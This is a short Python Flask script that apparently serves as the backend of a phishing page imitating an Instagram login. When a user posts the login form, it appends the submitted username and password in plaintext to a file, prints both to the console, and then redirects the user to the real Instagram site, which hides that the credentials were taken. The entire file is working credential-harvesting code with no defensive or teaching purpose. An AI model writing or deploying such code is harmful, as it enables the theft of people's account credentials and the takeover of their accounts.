from flask import Flask, render_template, request, redirect
from datetime import datetime

app = Flask(__name__)

@app.route("/", methods=['GET', 'POST'])
def hello_world():
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        # Save credentials to create.txt
        with open('create.txt', 'a') as f:
            f.write(f"Timestamp: {timestamp}\nUsername: {username}\nPassword: {password}\n{'='*50}\n")
            
        print(f"Login attempt saved - Username: {username}")
        print(f"Login attempt saved - password: {password}")
        return redirect("https://www.instagram.com")
    return render_template("index.html")

if __name__ == "__main__":
    app.run(debug=True, port=1111)